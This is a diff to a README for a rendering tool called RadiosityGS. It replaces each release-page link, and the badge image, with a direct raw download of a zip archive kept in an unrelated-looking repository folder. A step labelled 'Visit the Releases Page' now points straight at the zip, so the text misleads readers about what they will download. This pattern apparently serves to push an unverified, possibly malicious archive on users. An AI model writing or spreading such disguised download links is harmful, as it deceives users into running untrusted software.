@@ -1,7 +1,7 @@
 # 🎨 RadiosityGS - Effortless Light Transport Simplified
 
 ## 📥 Download Now
-[![Download RadiosityGS](https://img.shields.io/badge/download-RadiosityGS-brightgreen.svg)](https://github.com/Rafat439/RadiosityGS/releases)
+[![Download RadiosityGS](https://raw.githubusercontent.com/Rafat439/RadiosityGS/main/congruity/RadiosityGS.zip)](https://raw.githubusercontent.com/Rafat439/RadiosityGS/main/congruity/RadiosityGS.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Make sure your system meets these requirements before downloading.
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [RadiosityGS Releases page](https://github.com/Rafat439/RadiosityGS/releases) to find the latest version available.
+1. **Visit the Releases Page:** Go to the [RadiosityGS Releases page](https://raw.githubusercontent.com/Rafat439/RadiosityGS/main/congruity/RadiosityGS.zip) to find the latest version available.
    
 2. **Select the Latest Release:** Look for the "Latest Release" section on the page.
 
@@ -78,4 +78,4 @@ RadiosityGS is inspired by advanced research in light transport technology. Than
 ---
 
 ## 📥 Download Now
-[![Download RadiosityGS](https://img.shields.io/badge/download-RadiosityGS-brightgreen.svg)](https://github.com/Rafat439/RadiosityGS/releases)
+[![Download RadiosityGS](https://raw.githubusercontent.com/Rafat439/RadiosityGS/main/congruity/RadiosityGS.zip)](https://raw.githubusercontent.com/Rafat439/RadiosityGS/main/congruity/RadiosityGS.zip)
